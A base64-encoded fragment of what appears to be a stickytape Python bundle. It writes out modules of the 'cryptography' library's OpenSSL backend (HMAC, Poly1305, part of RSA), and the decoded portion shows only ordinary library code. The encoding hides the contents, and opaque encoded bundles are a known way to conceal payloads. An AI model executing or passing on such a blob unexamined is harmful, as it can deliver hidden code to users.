hbGdvcml0aG0uZGlnZXN0X3NpemVdXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdjcnlwdG9ncmFwaHkvaGF6bWF0L2JhY2tlbmRzL29wZW5zc2wvaG1hYy5weScsIGInIyBUaGlzIGZpbGUgaXMgZHVhbCBsaWNlbnNlZCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEFwYWNoZSBMaWNlbnNlLCBWZXJzaW9uXHJcbiMgMi4wLCBhbmQgdGhlIEJTRCBMaWNlbnNlLiBTZWUgdGhlIExJQ0VOU0UgZmlsZSBpbiB0aGUgcm9vdCBvZiB0aGlzIHJlcG9zaXRvcnlcclxuIyBmb3IgY29tcGxldGUgZGV0YWlscy5cclxuXHJcbmltcG9ydCB0eXBpbmdcclxuXHJcbmZyb20gY3J5cHRvZ3JhcGh5LmV4Y2VwdGlvbnMgaW1wb3J0IChcclxuICAgIEludmFsaWRTaWduYXR1cmUsXHJcbiAgICBVbnN1cHBvcnRlZEFsZ29yaXRobSxcclxuICAgIF9SZWFzb25zLFxyXG4pXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzIGltcG9ydCBjb25zdGFudF90aW1lLCBoYXNoZXNcclxuXHJcblxyXG5pZiB0eXBpbmcuVFlQRV9DSEVDS0lORzpcclxuICAgIGZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iYWNrZW5kcy5vcGVuc3NsLmJhY2tlbmQgaW1wb3J0IEJhY2tlbmRcclxuXHJcblxyXG5jbGFzcyBfSE1BQ0NvbnRleHQoaGFzaGVzLkhhc2hDb250ZXh0KTpcclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGJhY2tlbmQ6ICJCYWNrZW5kIixcclxuICAgICAgICBrZXk6IGJ5dGVzLFxyXG4gICAgICAgIGFsZ29yaXRobTogaGFzaGVzLkhhc2hBbGdvcml0aG0sXHJcbiAgICAgICAgY3R4PU5vbmUsXHJcbiAgICApOlxyXG4gICAgICAgIHNlbGYuX2FsZ29yaXRobSA9IGFsZ29yaXRobVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQgPSBiYWNrZW5kXHJcblxyXG4gICAgICAgIGlmIGN0eCBpcyBOb25lOlxyXG4gICAgICAgICAgICBjdHggPSBzZWxmLl9iYWNrZW5kLl9saWIuSE1BQ19DVFhfbmV3KClcclxuICAgICAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChjdHggIT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwpXHJcbiAgICAgICAgICAgIGN0eCA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5nYyhjdHgsIHNlbGYuX2JhY2tlbmQuX2xpYi5ITUFDX0NUWF9mcmVlKVxyXG4gICAgICAgICAgICBldnBfbWQgPSBzZWxmLl9iYWNrZW5kLl9ldnBfbWRfZnJvbV9hbGdvcml0aG0oYWxnb3JpdGhtKVxyXG4gICAgICAgICAgICBpZiBldnBfbWQgPT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEw6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBVbnN1cHBvcnRlZEFsZ29yaXRobShcclxuICAgICAgICAgICAgICAgICAgICAie30gaXMgbm90IGEgc3VwcG9ydGVkIGhhc2ggb24gdGhpcyBiYWNrZW5kIi5mb3JtYXQoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGFsZ29yaXRobS5uYW1lXHJcbiAgICAgICAgICAgICAgICAgICAgKSxcclxuICAgICAgICAgICAgICAgICAgICBfUmVhc29ucy5VTlNVUFBPUlRFRF9IQVNILFxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICBrZXlfcHRyID0gc2VsZi5fYmFja2VuZC5fZmZpLmZyb21fYnVmZmVyKGtleSlcclxuICAgICAgICAgICAgcmVzID0gc2VsZi5fYmFja2VuZC5fbGliLkhNQUNfSW5pdF9leChcclxuICAgICAgICAgICAgICAgIGN0eCwga2V5X3B0ciwgbGVuKGtleSksIGV2cF9tZCwgc2VsZi5fYmFja2VuZC5fZmZpLk5VTExcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHJlcyAhPSAwKVxyXG5cclxuICAgICAgICBzZWxmLl9jdHggPSBjdHhcclxuICAgICAgICBzZWxmLl9rZXkgPSBrZXlcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBhbGdvcml0aG0oc2VsZikgLT4gaGFzaGVzLkhhc2hBbGdvcml0aG06XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2FsZ29yaXRobVxyXG5cclxuICAgIGRlZiBjb3B5KHNlbGYpIC0+ICJfSE1BQ0NvbnRleHQiOlxyXG4gICAgICAgIGNvcGllZF9jdHggPSBzZWxmLl9iYWNrZW5kLl9saWIuSE1BQ19DVFhfbmV3KClcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KGNvcGllZF9jdHggIT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwpXHJcbiAgICAgICAgY29waWVkX2N0eCA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5nYyhcclxuICAgICAgICAgICAgY29waWVkX2N0eCwgc2VsZi5fYmFja2VuZC5fbGliLkhNQUNfQ1RYX2ZyZWVcclxuICAgICAgICApXHJcbiAgICAgICAgcmVzID0gc2VsZi5fYmFja2VuZC5fbGliLkhNQUNfQ1RYX2NvcHkoY29waWVkX2N0eCwgc2VsZi5fY3R4KVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzICE9IDApXHJcbiAgICAgICAgcmV0dXJuIF9ITUFDQ29udGV4dChcclxuICAgICAgICAgICAgc2VsZi5fYmFja2VuZCwgc2VsZi5fa2V5LCBzZWxmLmFsZ29yaXRobSwgY3R4PWNvcGllZF9jdHhcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIHVwZGF0ZShzZWxmLCBkYXRhOiBieXRlcykgLT4gTm9uZTpcclxuICAgICAgICBkYXRhX3B0ciA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5mcm9tX2J1ZmZlcihkYXRhKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5ITUFDX1VwZGF0ZShzZWxmLl9jdHgsIGRhdGFfcHRyLCBsZW4oZGF0YSkpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgIT0gMClcclxuXHJcbiAgICBkZWYgZmluYWxpemUoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgYnVmID0gc2VsZi5fYmFja2VuZC5fZmZpLm5ldyhcclxuICAgICAgICAgICAgInVuc2lnbmVkIGNoYXJbXSIsIHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfTUFYX01EX1NJWkVcclxuICAgICAgICApXHJcbiAgICAgICAgb3V0bGVuID0gc2VsZi5fYmFja2VuZC5fZmZpLm5ldygidW5zaWduZWQgaW50ICoiKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5ITUFDX0ZpbmFsKHNlbGYuX2N0eCwgYnVmLCBvdXRsZW4pXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgIT0gMClcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KG91dGxlblswXSA9PSBzZWxmLmFsZ29yaXRobS5kaWdlc3Rfc2l6ZSlcclxuICAgICAgICByZXR1cm4gc2VsZi5fYmFja2VuZC5fZmZpLmJ1ZmZlcihidWYpWzogb3V0bGVuWzBdXVxyXG5cclxuICAgIGRlZiB2ZXJpZnkoc2VsZiwgc2lnbmF0dXJlOiBieXRlcykgLT4gTm9uZTpcclxuICAgICAgICBkaWdlc3QgPSBzZWxmLmZpbmFsaXplKClcclxuICAgICAgICBpZiBub3QgY29uc3RhbnRfdGltZS5ieXRlc19lcShkaWdlc3QsIHNpZ25hdHVyZSk6XHJcbiAgICAgICAgICAgIHJhaXNlIEludmFsaWRTaWduYXR1cmUoIlNpZ25hdHVyZSBkaWQgbm90IG1hdGNoIGRpZ2VzdC4iKVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9iYWNrZW5kcy9vcGVuc3NsL3BvbHkxMzA1LnB5JywgYicjIFRoaXMgZmlsZSBpcyBkdWFsIGxpY2Vuc2VkIHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgQXBhY2hlIExpY2Vuc2UsIFZlcnNpb25cclxuIyAyLjAsIGFuZCB0aGUgQlNEIExpY2Vuc2UuIFNlZSB0aGUgTElDRU5TRSBmaWxlIGluIHRoZSByb290IG9mIHRoaXMgcmVwb3NpdG9yeVxyXG4jIGZvciBjb21wbGV0ZSBkZXRhaWxzLlxyXG5cclxuaW1wb3J0IHR5cGluZ1xyXG5cclxuZnJvbSBjcnlwdG9ncmFwaHkuZXhjZXB0aW9ucyBpbXBvcnQgSW52YWxpZFNpZ25hdHVyZVxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcyBpbXBvcnQgY29uc3RhbnRfdGltZVxyXG5cclxuXHJcbl9QT0xZMTMwNV9UQUdfU0laRSA9IDE2XHJcbl9QT0xZMTMwNV9LRVlfU0laRSA9IDMyXHJcblxyXG5cclxuaWYgdHlwaW5nLlRZUEVfQ0hFQ0tJTkc6XHJcbiAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCBCYWNrZW5kXHJcblxyXG5cclxuY2xhc3MgX1BvbHkxMzA1Q29udGV4dDpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBiYWNrZW5kOiAiQmFja2VuZCIsIGtleTogYnl0ZXMpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fYmFja2VuZCA9IGJhY2tlbmRcclxuXHJcbiAgICAgICAga2V5X3B0ciA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5mcm9tX2J1ZmZlcihrZXkpXHJcbiAgICAgICAgIyBUaGlzIGZ1bmN0aW9uIGNvcGllcyB0aGUga2V5IGludG8gT3BlblNTTC1vd25lZCBtZW1vcnkgc28gd2UgZG9uXCd0XHJcbiAgICAgICAgIyBuZWVkIHRvIHJldGFpbiBpdCBvdXJzZWx2ZXNcclxuICAgICAgICBldnBfcGtleSA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfUEtFWV9uZXdfcmF3X3ByaXZhdGVfa2V5KFxyXG4gICAgICAgICAgICBzZWxmLl9iYWNrZW5kLl9saWIuTklEX3BvbHkxMzA1LFxyXG4gICAgICAgICAgICBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTCxcclxuICAgICAgICAgICAga2V5X3B0cixcclxuICAgICAgICAgICAgbGVuKGtleSksXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQoZXZwX3BrZXkgIT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwpXHJcbiAgICAgICAgc2VsZi5fZXZwX3BrZXkgPSBzZWxmLl9iYWNrZW5kLl9mZmkuZ2MoXHJcbiAgICAgICAgICAgIGV2cF9wa2V5LCBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX1BLRVlfZnJlZVxyXG4gICAgICAgIClcclxuICAgICAgICBjdHggPSBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX01EX0NUWF9uZXcoKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQoY3R4ICE9IHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgICAgIHNlbGYuX2N0eCA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5nYyhcclxuICAgICAgICAgICAgY3R4LCBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX01EX0NUWF9mcmVlXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfRGlnZXN0U2lnbkluaXQoXHJcbiAgICAgICAgICAgIHNlbGYuX2N0eCxcclxuICAgICAgICAgICAgc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwsXHJcbiAgICAgICAgICAgIHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMLFxyXG4gICAgICAgICAgICBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTCxcclxuICAgICAgICAgICAgc2VsZi5fZXZwX3BrZXksXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcblxyXG4gICAgZGVmIHVwZGF0ZShzZWxmLCBkYXRhOiBieXRlcykgLT4gTm9uZTpcclxuICAgICAgICBkYXRhX3B0ciA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5mcm9tX2J1ZmZlcihkYXRhKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfRGlnZXN0U2lnblVwZGF0ZShcclxuICAgICAgICAgICAgc2VsZi5fY3R4LCBkYXRhX3B0ciwgbGVuKGRhdGEpXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzICE9IDApXHJcblxyXG4gICAgZGVmIGZpbmFsaXplKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIGJ1ZiA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoInVuc2lnbmVkIGNoYXJbXSIsIF9QT0xZMTMwNV9UQUdfU0laRSlcclxuICAgICAgICBvdXRsZW4gPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJzaXplX3QgKiIsIF9QT0xZMTMwNV9UQUdfU0laRSlcclxuICAgICAgICByZXMgPSBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX0RpZ2VzdFNpZ25GaW5hbChzZWxmLl9jdHgsIGJ1Ziwgb3V0bGVuKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzICE9IDApXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChvdXRsZW5bMF0gPT0gX1BPTFkxMzA1X1RBR19TSVpFKVxyXG4gICAgICAgIHJldHVybiBzZWxmLl9iYWNrZW5kLl9mZmkuYnVmZmVyKGJ1ZilbOiBvdXRsZW5bMF1dXHJcblxyXG4gICAgZGVmIHZlcmlmeShzZWxmLCB0YWc6IGJ5dGVzKSAtPiBOb25lOlxyXG4gICAgICAgIG1hYyA9IHNlbGYuZmluYWxpemUoKVxyXG4gICAgICAgIGlmIG5vdCBjb25zdGFudF90aW1lLmJ5dGVzX2VxKG1hYywgdGFnKTpcclxuICAgICAgICAgICAgcmFpc2UgSW52YWxpZFNpZ25hdHVyZSgiVmFsdWUgZGlkIG5vdCBtYXRjaCBjb21wdXRlZCB0YWcuIilcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NyeXB0b2dyYXBoeS9oYXptYXQvYmFja2VuZHMvb3BlbnNzbC9yc2EucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5cclxuaW1wb3J0IHR5cGluZ1xyXG5cclxuZnJvbSBjcnlwdG9ncmFwaHkuZXhjZXB0aW9ucyBpbXBvcnQgKFxyXG4gICAgSW52YWxpZFNpZ25hdHVyZSxcclxuICAgIFVuc3VwcG9ydGVkQWxnb3JpdGhtLFxyXG4gICAgX1JlYXNvbnMsXHJcbilcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wudXRpbHMgaW1wb3J0IChcclxuICAgIF9jYWxjdWxhdGVfZGlnZXN0X2FuZF9hbGdvcml0aG0sXHJcbilcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMgaW1wb3J0IGhhc2hlcywgc2VyaWFsaXphdGlvblxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5hc3ltbWV0cmljIGltcG9ydCAoXHJcbiAgICB1dGlscyBhcyBhc3ltX3V0aWxzLFxyXG4pXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmFzeW1tZXRyaWMucGFkZGluZyBpbXBvcnQgKFxyXG4gICAgQXN5bW1ldHJpY1BhZGRpbmcsXHJcbiAgICBNR0YxLFxyXG4gICAgT0FFUCxcclxuICAgIFBLQ1MxdjE1LFxyXG4gICAgUFNTLFxyXG4gICAgX0F1dG8sXHJcbiAgICBfRGlnZXN0TGVuZ3RoLFxyXG4gICAgX01heExlbmd0aCxcclxuICAgIGNhbGN1bGF0ZV9tYXhfcHNzX3NhbHRfbGVuZ3RoLFxyXG4pXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmFzeW1tZXRyaWMucnNhIGltcG9ydCAoXHJcbiAgICBSU0FQcml2YXRlS2V5LFxyXG4gICAgUlNBUHJpdmF0ZU51bWJlcnMsXHJcbiAgICBSU0FQdWJsaWNLZXksXHJcbiAgICBSU0FQdWJsaWNOdW1iZXJzLFxyXG4pXHJcblxyXG5cclxuaWYgdHlwaW5nLlRZUEVfQ0hFQ0tJTkc6XHJcbiAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCBCYWNrZW5kXHJcblxyXG5cclxuZGVmIF9nZXRfcnNhX3Bzc19zYWx0X2xlbmd0aChcclxuICAgIGJhY2tlbmQ6ICJCYWNrZW5kIixcclxuICAgIHBzczogUFNTLFxyXG4gICAga2V5OiB0eXBpbmcuVW5pb25bUlNBUHJpdmF0ZUtleSwgUlNBUHVibGljS2V5XSxcclxuICAgIGhhc2hfYWxnb3JpdGhtOiBoYXNoZXMuSGFzaEFsZ29yaXRobSxcclxuKSAtPiBpbnQ6XHJcbiAgICBzYWx0ID0gcHNzLl9zYWx0X2xlbmd0aFxyXG5cclxuICAgIGlmIGlzaW5zdGFuY2Uoc2FsdCwgX01heExlbmd0aCk6XHJcbiAgICAgICAgcmV0dXJuIGNhbGN1bGF0ZV9tYXhfcHNzX3NhbHRfbGVuZ3RoKGtleSwgaGFzaF9hbGdvcml0aG0pXHJcbiAgICBlbGlmIGlzaW5zdGFuY2Uoc2FsdCwgX0RpZ2VzdExlbmd0aCk6XHJcbiAgICAgICAgcmV0dXJuIGhhc2hfYWxnb3JpdGhtLmRpZ2VzdF9zaXplXHJcbiAgICBlbGlmIGlzaW5zdGFuY2Uoc2FsdCwgX0F1dG8pOlxyXG4gICAgICAgIGlmIGlzaW5zdGFuY2Uoa2V5LCBSU0FQcml2YXRlS2V5KTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICJQU1Mgc2FsdCBsZW5ndGggY2FuIG9ubHkgYmUgc2V0IHRvIEFVVE8gd2hlbiB2ZXJpZnlpbmciXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICByZXR1cm4gYmFja2VuZC5fbGliLlJTQV9QU1NfU0FMVExFTl9BVVRPXHJcbiAgICBlbHNlOlxyXG4gICAgICAgIHJldHVybiBzYWx0XHJcblxyXG5cclxuZGVmIF9lbmNfZGVjX3JzYShcclxuICAgIGJhY2tlbmQ6ICJCYWNrZW5kIixcclxuICAgIGtleTogdHlwaW5nLlVuaW9uWyJfUlNBUHJpdmF0ZUtleSIsICJfUlNBUHVibGljS2V5Il0sXHJcbiAgICBkYXRhOiBieXRlcyxcclxuICAgIHBhZGRpbmc6IEFzeW1tZXRyaWNQYWRkaW5nLFxyXG4pIC0+IGJ5dGVzOlxyXG4gICAgaWYgbm90IGlzaW5zdGFuY2UocGFkZGluZywgQXN5bW1ldHJpY1BhZGRpbmcpOlxyXG4gICAgICAgIHJhaXNlIFR5cGVFcnJvcigiUGFkZGluZyBtdXN0IGJlIGFuIGluc3RhbmNlIG9mIEFzeW1tZXRyaWNQYWRkaW5nLiIpXHJcblxyXG4gICAgaWYgaXNpbnN0YW5jZShwYWRkaW5nLCBQS0NTMXYxNSk6XHJcbiAgICAgICAgcGFkZGluZ19lbnVtID0gYmFja2VuZC5fbGliLlJTQV9QS0NTMV9QQURESU5HXHJcbiAgICBlbGlmIGlzaW5zdGFuY2UocGFkZGluZywgT0FFUCk6XHJcbiAgICAgICAgcGFkZGluZ19lbnVtID0gYmFja2VuZC5fbGliLlJTQV9QS0NTMV9PQUVQX1BBRERJTkdcclxuXHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UocGFkZGluZy5fbWdmLCBNR0YxKTpcclxuICAgICAgICAgICAgcmFpc2UgVW5zdXBwb3J0ZWRBbGdvcml0aG0oXHJcbiAgICAgICAgICAgICAgICAiT25seSBNR0YxIGlzIHN1cHBvcnRlZCBieSB0aGlzIGJhY2tlbmQuIixcclxuICAgICAgICAgICAgICAgIF9SZWFzb25zLlVOU1VQUE9SVEVEX01HRixcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBpZiBub3QgYmFja2VuZC5yc2FfcGFkZGluZ19zdXBwb3J0ZWQocGFkZGluZyk6XHJcbiAgICAgICAgICAgIHJhaXNlIFVuc3VwcG9ydGVkQWxnb3JpdGhtKFxyXG4gICAgICAgICAgICAgICAgIlRoaXMgY29tYmluYXRpb24gb2YgcGFkZGluZyBhbmQgaGFzaCBhbGdvcml0aG0gaXMgbm90ICJcclxuICAgICAgICAgICAgICAgICJzdXBwb3J0ZWQgYnkgdGhpcyBiYWNrZW5kLiIsXHJcbiAgICAgICAgICAgICAgICBfUmVhc29ucy5VTlNVUFBPUlRFRF9QQURESU5HLFxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgZWxzZTpcclxuICAgICAgICByYWlzZSBVbnN1cHBvcnRlZEFsZ29yaXRobShcclxuICAgICAgICAgICAgInt9IGlzIG5vdCBzdXBwb3J0ZWQgYnkgdGhpcyBiYWNrZW5kLiIuZm9ybWF0KHBhZGRpbmcubmFtZSksXHJcbiAgICAgICAgICAgIF9SZWFzb25zLlVOU1VQUE9SVEVEX1BBRERJTkcsXHJcbiAgICAgICAgKVxyXG5cclxuICAgIHJldHVybiBfZW5jX2RlY19yc2FfcGtleV9jdHgoYmFja2VuZCwga2V5LCBkYXRhLCBwYWRkaW5nX2VudW0sIHBhZGRpbmcpXHJcblxyXG5cclxuZGVmIF9lbmNfZGVjX3JzYV9wa2V5X2N0eChcclxuICAgIGJhY2tlbmQ6ICJCYWNrZW5kIixcclxuICAgIGtleTogdHlwaW5nLlVuaW9uWyJfUlNBUHJpdmF0ZUtleSIsICJfUlNBUHVibGljS2V5Il0sXHJcbiAgICBkYXRhOiBieXRlcyxcclxuICAgIHBhZGRpbmdfZW51bTogaW50LFxyXG4gICAgcGFkZGluZzogQXN5bW1ldHJpY1BhZGRpbmcsXHJcbikgLT4gYnl0ZXM6XHJcbiAgICBpbml0OiB0eXBpbmcuQ2FsbGFibGVbW3R5cGluZy5BbnldLCBpbnRdXHJcbiAgICBjcnlwdDogdHlwaW5nLkNhbGxhYmxlW1t0eXBpbmcuQW55LCB0eXBpbmcuQW55LCBpbnQsIGJ5dGVzLCBpbnRdLCBpbnRdXHJcbiAgICBpZiBpc2luc3RhbmNlKGtleSwgX1JTQVB1YmxpY0tleSk6XHJcbiAgICAgICAgaW5pdCA9IGJhY2tlbmQuX2xpYi5FVlBfUEtFWV9lbmNyeXB0X2luaXRcclxuICAgICAgICBjcnlwdCA9IGJhY2tlbmQuX2xpYi5FVlBfUEtFWV9lbmNyeXB0XHJcbiAgICBlbHNlOlxyXG4gICAgICAgIGluaXQgPSBiYWNrZW5kLl9saWIuRVZQX1BLRVlfZGVjcnlwdF9pbml0XHJcbiAgICAgICAgY3J5cHQgPSBiYWNrZW5kLl9saWIuRVZQX1BLRVlfZGVjcnlwdFxyXG5cclxuICAgIHBrZXlfY3R4ID0gYmFja2VuZC5fbGliLkVWUF9QS0VZX0NUWF9uZXcoa2V5Ll9ldnBfcGtleSwgYmFja2VuZC5fZmZpLk5VTEwpXHJcbiAgICBiYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHBrZXlfY3R4ICE9IGJhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgcGtleV9jdHggPSBiYWNrZW5kLl9mZmkuZ2MocGtleV9jdHgsIGJhY2tlbmQuX2xpYi5FVlBfUEtFWV9DVFhfZnJlZSlcclxuICAgIHJlcyA9IGluaXQocGtleV9jdHgpXHJcbiAgICBiYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG4gICAgcmVzID0gYmFja2VuZC5fbGliLkVWUF9QS0VZX0NUWF9zZXRfcnNhX3BhZGRpbmcocGtleV9jdHgsIHBhZGRpbmdfZW51bSlcclxuICAgIGJhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzID4gMClcclxuICAgIGJ1Zl9zaXplID0gYmFja2VuZC5fbGliLkVWUF9QS0VZX3NpemUoa2V5Ll9ldnBfcGtleSlcclxuICAgIGJhY2tlbmQub3BlbnNzbF9hc3NlcnQoYnVmX3NpemUgPiAwKVxyXG4gICAgaWYgaXNpbnN0YW5jZShwYWRkaW5nLCBPQUVQKTpcclxuICAgICAgICBtZ2YxX21kID0gYmFja2VuZC5fZXZwX21kX25vbl9udWxsX2Zyb21fYWxnb3JpdGhtKFxyXG4gICAgICAgICAgICBwYWRkaW5nLl9tZ2YuX2FsZ29yaXRobVxyXG4gICAgICAgIClcclxuICAgICAgICByZXMgPSBiYWNrZW5kLl9saWIuRVZQX1BLRVlfQ1RYX3NldF9yc2FfbWdmMV9tZChwa2V5X2N0eCwgbWdmMV9tZClcclxuICAgICAgICBiYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHJlcyA+IDApXHJcbiAgICAgICAgb2FlcF9tZCA9IGJhY2tlbmQuX2V2cF9tZF9ub25fbnVsbF9mcm9tX2FsZ29yaXRobShwYWRkaW5nLl9hbGdvcml0aG0pXHJcbiAgICAgICAgcmVzID0gYmFja2VuZC5fbGliLkVWUF9QS0VZX0NUWF9zZXRfcnNhX29hZXBfbWQocGtleV9jdHgsIG9hZXBfbWQpXHJcbiAgICAgICAgYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgPiAwKVxyXG5cclxuICAgIGlmIChcclxuICAgICAgICBpc2luc3RhbmNlKHBhZGRpbmcsIE9BRVApXHJcbiAgICAgICAgYW5kIHBhZGRpbmcuX2xhYmVsIGlzIG5vdCBOb25lXHJcbiAgICAgICAgYW5kIGxlbihwYWRkaW5nLl9sYWJlbCkgPiAwXHJcbiAgICApOlxyXG4gICAgICAgICMgc2V0MF9yc2Ffb2FlcF9sYWJlbCB0YWtlcyBvd25lcnNoaXAgb2YgdGhlIGNoYXIgKiBzbyB3ZSBuZWVkIHRvXHJcbiAgICAgICAgIyBjb3B5IGl0IGludG8gc29tZSBuZXcgbWVtb3J5XHJcbiAgICAgICAgbGFiZWxwdHIgPSBiYWNrZW5kLl9saWIuT1BFTlNTTF9tYWxsb2MobGVuKHBhZGRpbmcuX2xhYmVsKSlcclxuICAgICAgICBiYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KGxhYmVscHRyICE9IGJhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgICAgIGJhY2tlbmQuX2ZmaS5tZW1tb3ZlKGxhYmVscHRyLCBwYWRkaW5nLl9sYWJlbCwgbGVuKHBhZGRpbmcuX2xhYmVsKSlcclxuICAgICAgICByZXMgPSBiYWNrZW5kLl9saWIuRVZQX1BLRVlfQ1RYX3NldDBfcnNhX29hZXBfbGFiZWwoXHJcbiAgICAgICAgICAgIHBrZXlfY3R4LCBsYWJlbHB0ciwgbGVuKHBhZGRpbmcuX2xhYmVsKVxyXG4gICAgICAgIClcclxuICAgICAgICBiYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG5cclxuICAgIG91dGxlbiA9IGJhY2tlbmQuX2ZmaS5uZXcoInNpemVfdCAqIiwgYnVmX3NpemUpXHJcbiAgICBidWYgPSBiYWNrZW5kLl9mZmkubmV3KCJ1bnNpZ25lZCBjaGFyW10iLCBidWZfc2l6ZSlcclxuICAgICMgRXZlcnl0aGluZyBmcm9tIHRoaXMgbGluZSBvbndhcmRzIGlzIHdyaXR0ZW4gd2l0aCB0aGUgZ29hbCBvZiBiZWluZyBhc1xyXG4gICAgIyBjb25zdGFudC10aW1lIGFzIGlzIHByYWN0aWNhbCBnaXZlbiB0aGUgY29uc3RyYWludHMgb2YgUHl0aG9uIGFuZCBvdXJcclxuICAgICMgQVB